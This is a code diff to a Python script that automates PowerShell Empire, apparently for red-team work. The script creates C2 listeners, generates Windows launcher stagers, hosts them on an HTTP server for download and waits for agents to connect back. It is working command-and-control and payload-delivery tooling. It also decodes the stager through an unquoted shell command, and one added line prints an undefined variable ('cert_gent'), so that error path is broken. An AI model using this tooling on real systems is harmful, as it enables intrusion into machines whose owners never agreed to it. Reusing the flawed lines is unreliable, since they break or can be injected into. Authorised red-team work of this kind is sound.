@@ -186,7 +186,9 @@ if http_server_tls.lower() == 'true':
     if cert_gen['outcome'] == 'success':
         print('cert_gen succeeded.\n')
     else:
-        print('cert_gen failed... Exiting.\n')
+        print('cert_gen failed with response:\n')
+        print(cert_gent)
+        print('\nExiting...')
         clean_up()
 
 # Ask the http_server task to start a web service.
@@ -198,7 +200,9 @@ if http_service['outcome'] == 'success':
     print('start_server succeeded.\n')
     http_service_exists = [http_server_task_name, http_instruct_instance]
 else:
-    print('start_server failed... Exiting.\n')
+    print('start_server failed with response:\n')
+    print(http_service)
+    print('\nExiting...')
     clean_up()
 
 # Use a random string for the PowerShell Empire instruct_instance.
@@ -218,167 +222,139 @@ if c2_listener_tls.lower() == 'true':
     if cert_gen['outcome'] == 'success':
         print('cert_gen succeeded.\n')
     else:
-        print('cert_gen failed... Exiting.\n')
+        print('cert_gen failed with response:\n')
+        print(cert_gen)
+        print('\nExiting...')
         clean_up()
 
-# Cycle through listener profiles for the powershell_empire task.
-c2_listener_type = None
-while c2_listener_type != 'exit':
-    c2_listener_type = input('Enter a C2 listener type or enter "exit" to initiate clean up: ')
-    # Initiate clean up if "exit" entered as profile name.
-    if c2_listener_type == 'exit':
-        print('Received "exit" input. Initiating clean up...')
-        clean_up()
-    if c2_listener_type == 'http_malleable':
-        c2_listener_profile = input('Enter a C2 profile name: ')
-    else:
-        c2_listener_profile = None
+# Setup C2 listener for the powershell_empire task.
+c2_listener_type = input('Enter a C2 listener type or enter "exit" to initiate clean up: ')
+# Initiate clean up if "exit" entered as profile name.
+if c2_listener_type == 'exit':
+    print('Received "exit" input. Initiating clean up...')
+    clean_up()
+if c2_listener_type == 'http_malleable':
+    c2_listener_profile = input('Enter a C2 profile name: ')
+else:
+    c2_listener_profile = None
 
-    # Check for an existing agent and kill it.
-    if agent_exists:
-        print(f'\nSending kill command to agent with name {agent_exists[0]}.\n')
-        instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))
-        instruct_command = 'kill_agent'
-        instruct_args = {'Name': agent_exists[0]}
-        kill_agent_response = h.interact_with_task(agent_exists[1], instruct_command, instruct_instance, instruct_args)
-        if 'outcome' in kill_agent_response and kill_agent_response['outcome'] == 'failed':
-            print(f'Failed to kill agent with name {agent_exists[0]}.\n')
-            print(kill_agent_response)
+# Create a new listener.
+if c2_listener_profile:
+    print(f'\nCreating an {c2_listener_type}:{c2_listener_profile} listener on {c2_task_name} task.')
+else:
+    print(f'\nCreating an {c2_listener_type} listener on {c2_task_name} task.')
+if c2_listener_tls.lower() == 'true':
+    c2_listener_protocol = 'https'
+else:
+    c2_listener_protocol = 'http'
+if c2_domain_name != 'None':
+    c2_listener_host = f'{c2_listener_protocol}://{c2_task_host_name}.{c2_domain_name}:{c2_listener_port}'
+else:
+    c2_listener_host = f'{c2_listener_protocol}://{c2_task_ip}:{c2_listener_port}'
+instruct_command = 'create_listener'
+instruct_args = {
+    'listener_type': f'{c2_listener_type}',
+    'Name': f'{c2_listener_type}',
+    'Host': c2_listener_host,
+    'Port': c2_listener_port
+}
+if c2_listener_profile:
+    instruct_args['Profile'] = f'{c2_listener_profile}.profile'
+if c2_listener_tls.lower() == 'true':
+    instruct_args['CertPath'] = '/opt/Empire/empire/server/data/'
+create_listener = h.interact_with_task(c2_task_name, instruct_command, c2_instruct_instance, instruct_args)
+if create_listener['outcome'] == 'success':
+    print('\ncreate_listener succeeded.\n')
+    c2_listener_exists = [c2_task_name, c2_listener_type]
+else:
+    print('\ncreate_listener failed with response:\n')
+    print(create_listener)
+    print('\nExiting...')
+    clean_up()
 
-    if stager_exists:
-        print(f'\nDeleting the stager file {stager_exists} from the shared workspace.\n')
-        h.delete_file(stager_exists)
-        os.remove(stager_exists)
-
-    # Check for an existing listener and kill it.
-    if c2_listener_exists:
-        print(f'\nKilling existing listener {c2_listener_exists[1]}.\n')
-        instruct_command = 'kill_listener'
-        instruct_args = {'Name': c2_listener_exists[1]}
-        kill_listener_response = h.interact_with_task(
-            c2_listener_exists[0], instruct_command, c2_instruct_instance, instruct_args
-        )
-        if 'outcome' in kill_listener_response and kill_listener_response['outcome'] == 'failed':
-            print(f'Failed to kill listener {c2_listener_exists[1]}.\n')
-            print(kill_listener_response)
-            continue
-
-    # Create a new listener.
-    if c2_listener_profile:
-        print(f'\nCreating an {c2_listener_type}:{c2_listener_profile} listener on {c2_task_name} task.')
-    else:
-        print(f'\nCreating an {c2_listener_type} listener on {c2_task_name} task.')
-    if c2_listener_tls.lower() == 'true':
-        c2_listener_protocol = 'https'
-    else:
-        c2_listener_protocol = 'http'
-    if c2_domain_name != 'None':
-        c2_listener_host = f'{c2_listener_protocol}://{c2_task_host_name}.{c2_domain_name}:{c2_listener_port}'
-    else:
-        c2_listener_host = f'{c2_listener_protocol}://{c2_task_ip}:{c2_listener_port}'
-    instruct_command = 'create_listener'
-    instruct_args = {
-        'listener_type': f'{c2_listener_type}',
-        'Name': f'{c2_listener_type}',
-        'Host': c2_listener_host,
-        'Port': c2_listener_port
-    }
-    if c2_listener_profile:
-        instruct_args['Profile'] = f'{c2_listener_profile}.profile'
-    if c2_listener_tls.lower() == 'true':
-        instruct_args['CertPath'] = '/opt/Empire/empire/server/data/'
-    create_listener = h.interact_with_task(c2_task_name, instruct_command, c2_instruct_instance, instruct_args)
-    if create_listener['outcome'] == 'success':
-        print('\ncreate_listener succeeded.\n')
-        c2_listener_exists = [c2_task_name, c2_listener_type]
-    else:
-        print('\ncreate_listener failed with response:\n')
-        print(create_listener)
-        continue
-
-    # Generate a stager for the listener.
-    c2_stager = ast.literal_eval(
-        input(
-            'Enter a stager configuration in the form of a dictionary like the example below.\n'
-            '{ "StagerName": "windows/launcher_bat", "Delete": "False", "OutFile": "launcher.bat" }\n'
-            'Stager config: '
-        )
+# Generate a stager for the listener.
+c2_stager = ast.literal_eval(
+    input(
+        'Enter a stager configuration in the form of a dictionary like the example below.\n'
+        '{ "StagerName": "windows/launcher_bat", "Delete": "False", "OutFile": "launcher.bat" }\n'
+        'Stager config: '
     )
-    print(f'\nGenerating a stager for the {c2_listener_type} listener.')
-    instruct_command = 'create_stager'
-    instruct_args = {
-        'Listener': f'{c2_listener_type}'
-    }
-    for k, v in c2_stager.items():
-        instruct_args[k] = v
-    outfile = instruct_args['OutFile']
-    stager_name = instruct_args['StagerName']
-    create_stager = h.interact_with_task(c2_task_name, instruct_command, c2_instruct_instance, instruct_args)
-    if create_stager['outcome'] == 'success':
-        print('\ncreate_stager succeeded.\n')
-    else:
-        print('\ncreate_stager failed with response:\n')
-        print(create_stager)
-        continue
-    output = create_stager['stager'][stager_name]['Output']
-    subprocess.call(f'echo {output} | base64 -d > {outfile}', shell=True)
+)
+print(f'\nGenerating a stager for the {c2_listener_type} listener.')
+instruct_command = 'create_stager'
+instruct_args = {
+    'Listener': f'{c2_listener_type}'
+}
+for k, v in c2_stager.items():
+    instruct_args[k] = v
+outfile = instruct_args['OutFile']
+stager_name = instruct_args['StagerName']
+create_stager = h.interact_with_task(c2_task_name, instruct_command, c2_instruct_instance, instruct_args)
+if create_stager['outcome'] == 'success':
+    print('\ncreate_stager succeeded.\n')
+else:
+    print('\ncreate_stager failed with response:\n')
+    print(create_stager)
+    print('\nExiting...')
+    clean_up()
+output = create_stager['stager'][stager_name]['Output']
+subprocess.call(f'echo {output} | base64 -d > {outfile}', shell=True)
 
-    # Upload the stager file to the shared workspace
-    print('\nUploading the stager file to the shared workspace.')
-    f = open(f'{outfile}', 'rb')
-    raw_file = f.read()
-    h.create_file(f'{outfile}', raw_file)
-    stager_exists = f'{outfile}'
+# Upload the stager file to the shared workspace
+print('\nUploading the stager file to the shared workspace.')
+f = open(f'{outfile}', 'rb')
+raw_file = f.read()
+h.create_file(f'{outfile}', raw_file)
+stager_exists = f'{outfile}'
 
-    # Use a random string for the http_server instruct_instance.
-    http_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))
+# Use a random string for the http_server instruct_instance.
+http_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))
 
-    # Make sure there isn't an existing stager file with the same name on the http_server task.
-    print(f'\nDeleting any existing {outfile} stager from http_server task {http_server_task_name}.')
-    instruct_command = 'del'
-    instruct_args = {'file_name': f'{outfile}'}
-    delete_old_stager = h.interact_with_task(http_server_task_name, instruct_command, http_instruct_instance, instruct_args)
-    if delete_old_stager['outcome'] == 'success':
-        print('\nFile delete request succeeded.\n')
-    else:
-        print('\nNo existing file was present. Proceeding...\n')
+# Make sure there isn't an existing stager file with the same name on the http_server task.
+print(f'\nDeleting any existing {outfile} stager from http_server task {http_server_task_name}.')
+instruct_command = 'del'
+instruct_args = {'file_name': f'{outfile}'}
+delete_old_stager = h.interact_with_task(http_server_task_name, instruct_command, http_instruct_instance, instruct_args)
+if delete_old_stager['outcome'] == 'success':
+    print('\nFile delete request succeeded.\n')
+else:
+    print('\nNo existing file was present. Proceeding...\n')
 
-    # Ask the http_server task to sync it's local workspace from the shared workspace.
-    print(f'\nDownloading stager file from shared workspace to {http_server_task_name} task local workspace.')
-    instruct_command = 'sync_from_workspace'
-    http_sync = h.interact_with_task(http_server_task_name, instruct_command, http_instruct_instance)
-    if http_sync['outcome'] == 'success':
-        print('\nsync_from_workspace succeeded.\n')
-    else:
-        print('\nsync_from_workspace failed... Exiting.\n')
-        clean_up()
+# Ask the http_server task to sync it's local workspace from the shared workspace.
+print(f'\nDownloading stager file from shared workspace to {http_server_task_name} task local workspace.')
+instruct_command = 'sync_from_workspace'
+http_sync = h.interact_with_task(http_server_task_name, instruct_command, http_instruct_instance)
+if http_sync['outcome'] == 'success':
+    print('\nsync_from_workspace succeeded.\n')
+else:
+    print('\nsync_from_workspace failed with response:\n')
+    print(http_sync)
+    print('\nExiting...')
+    clean_up()
 
-    # Use a random string for the agent instruct_instance.
-    agent_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))
+if http_server_tls.lower() == 'true':
+    protocol = 'https'
+else:
+    protocol = 'http'
+if http_server_task_host_name == 'None':
+    http_server_url = f'{protocol}://{http_server_task_ip}/{outfile}'
+else:
+    http_server_url = f'{protocol}://www.{http_server_domain_name}/{outfile}'
+print(
+    f'\nWaiting for an agent connection on task {c2_task_name}.\n'
+    f'\nThe agent launcher can be downloaded from the HTTP server here:'
+    f'\nHTTP server URL: {http_server_url}'
+)
+agent_name = None
+try:
+    wait_for_c2_response = h.wait_for_c2(c2_task_name)
+    agent_name = wait_for_c2_response['agent_info']['name']
+    agent_exists = [agent_name, c2_task_name]
+    print(f'Agent connected with name {agent_name}\n')
+except KeyboardInterrupt:
+    print('Wait for agent operation interrupted. No agent connected.')
 
-    if http_server_tls.lower() == 'true':
-        protocol = 'https'
-    else:
-        protocol = 'http'
-    if http_server_task_host_name == 'None':
-        http_server_url = f'{protocol}://{http_server_task_ip}/{outfile}'
-    else:
-        http_server_url = f'{protocol}://www.{http_server_domain_name}/{outfile}'
-    print(
-        f'\nWaiting for an agent connection on task {c2_task_name}.\n'
-        f'\nThe agent launcher can be downloaded from the HTTP server here:'
-        f'\nHTTP server URL: {http_server_url}'
-    )
-    agent_name = None
-    try:
-        wait_for_c2_response = h.wait_for_c2(c2_task_name)
-        agent_name = wait_for_c2_response['agent_info']['name']
-        agent_exists = [agent_name, c2_task_name]
-        print(f'Agent connected with name {agent_name}\n')
-    except KeyboardInterrupt:
-        print('Wait for agent operation interrupted. No agent connected.')
-        continue
-
+if agent_exists:
     print(
         '\nAn agent is connected. '
         f'\nC2 task name: {c2_task_name}'
